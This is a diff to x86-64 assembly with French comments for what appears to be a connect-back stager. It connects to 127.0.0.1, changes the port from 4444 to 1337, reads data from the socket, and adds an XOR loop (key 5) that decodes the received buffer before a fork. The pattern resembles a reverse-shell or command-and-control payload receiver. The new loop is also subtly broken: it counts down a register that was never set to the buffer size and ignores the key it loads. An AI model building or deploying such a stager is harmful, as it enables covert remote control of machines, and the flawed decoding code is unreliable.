@@ -36,7 +36,7 @@ _connect:
         sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1
 
         push rcx
-        push word 0x5c11                ; port 4444
+        push word 0x3905                ; port 1337
         push word 2
         mov rsi, rsp                    ; struct sockaddr
         push byte 36                           
@@ -63,10 +63,33 @@ _read:
 	mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
 
+    mov rbx, rax            ; get size of what is received
+
+
 	cmp rax, 0
     jz _exit               ; loop in _read if receved is nothing
 
-	; XOR here !!!! Loop à faire
+_decrypt_xor:              ; xor function
+    ; rsi = buffer
+    ; rbx = size buffer
+    ; rdx (dl) = xor key
+    mov rdx, 5
+    mov r12, rsi
+    push rbx
+    next_byte:
+        mov rsi, r12
+        add rsi, rbx
+        sub rsi, 1
+        mov al, [rsi]
+        xor eax, 5
+        mov [rsi], al
+        dec rbx
+        ;xor [rsi+rbx-1], dl
+        ;dec rbx
+        loop next_byte
+
+
+
 	mov r12, rsi          ; mov fd dans r12 pour l'utiliser plutard
 
 ; ---- (57) sys_fork ----
